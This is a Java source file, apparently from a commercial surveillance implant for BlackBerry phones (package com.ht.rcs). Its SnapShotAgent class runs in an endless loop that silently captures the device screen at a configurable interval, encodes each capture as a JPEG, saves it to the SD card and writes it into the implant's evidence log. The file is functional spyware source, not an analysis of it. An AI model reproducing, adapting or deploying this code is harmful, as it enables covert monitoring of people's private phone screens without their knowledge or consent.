package com.ht.rcs.blackberry.agent;

import java.io.EOFException;

import net.rim.device.api.system.Bitmap;
import net.rim.device.api.system.Display;
import net.rim.device.api.system.EncodedImage;
import net.rim.device.api.system.JPEGEncodedImage;
import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.fs.AutoFlashFile;
import com.ht.rcs.blackberry.fs.Path;
import com.ht.rcs.blackberry.log.Log;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.WChar;

public class SnapShotAgent extends Agent {
    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 75;

    private static final int LOG_SNAPSHOT_VERSION = 2009031201;

    static Debug debug = new Debug("SnapShotAgent", DebugLevel.VERBOSE);

    private int timer = 60 * 1000;
    private boolean onNewWindow = false;

    public SnapShotAgent(int agentStatus) {
        super(Agent.AGENT_SNAPSHOT, agentStatus, true);
        Check.asserts(Log.convertTypeLog(this.agentId) == Log.LOGTYPE_SNAPSHOT,
                "Wrong Conversion");
    }

    protected SnapShotAgent(int agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void agentRun() {
        debug.trace("run");
        int width = Display.getWidth();
        int height = Display.getHeight();

        for (;;) {

            Bitmap bitmap = new Bitmap(width, height);
            Display.screenshot(bitmap);

            int size = width * height;
            int[] argbData = new int[size];
            bitmap.getARGB(argbData, 0, width, 0, 0, width, height);

            /*
             * byte[] plain = new byte[size * 4]; DataBuffer databuffer = new
             * DataBuffer(plain, 0, plain.length, true); for (int i = 0; i <
             * size; ++i) { databuffer.writeInt(argbData[i]); }
             * 
             * Check.ensures(plain.length == size * 4, "Wrong Plain size");
             */

            // EncodedImage encoded = PNGEncodedImage.encode(bitmap);
            EncodedImage encoded = JPEGEncodedImage.encode(bitmap,
                    SNAPSHOT_DEFAULT_JPEG_QUALITY);
            byte[] plain = encoded.getData();

            // EncodedImage encoded = EncodedImage.createEncodedImage(plain, 0,
            // size);
            AutoFlashFile file = new AutoFlashFile(Path.SD_PATH
                    + "snapshot.jpg", false);
            if (file.exists()) {
                file.delete();
            }
            file.create();
            file.write(plain);

            Check.requires(log != null, "Null log");

            log.createLog(getAdditionalData());
            log.writeLog(plain);
            log.close();

            if (agentSleep(timer)) {
                debug.trace(" clean stop");
                return;
            }
        }
    }

    private byte[] getAdditionalData() {
        String window = "Desktop";

        int wlen = window.length() * 2;
        int tlen = wlen + 24;
        byte[] additionalData = new byte[tlen];

        DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen, false);

        databuffer.writeInt(LOG_SNAPSHOT_VERSION); // version
        databuffer.writeInt(0); // process name len
        databuffer.writeInt(wlen); // windows name len

        byte[] windowsName = new byte[wlen];
        windowsName = WChar.getBytes(window);
        databuffer.write(windowsName);

        Check.asserts(windowsName.length == wlen, "Wrong windows name");
        Check.ensures(additionalData.length == tlen,
                "Wrong additional data name");

        debug.trace("Additional data len: " + additionalData.length);

        return additionalData;
    }

    protected boolean parse(byte[] confParameters) {
        Check.asserts(confParameters != null, "Null confParameters");

        DataBuffer databuffer = new DataBuffer(confParameters, 0,
                confParameters.length, false);

        try {

            int value = databuffer.readInt();

            if (value >= 1000) {
                this.timer = value;
            }
            debug.trace("timer: " + timer);

            value = databuffer.readInt();
            onNewWindow = (value == 1);
            debug.trace("onNewWindow: " + onNewWindow);

        } catch (EOFException e) {
            debug.error("params FAILED");
            return false;
        }

        return true;
    }

}
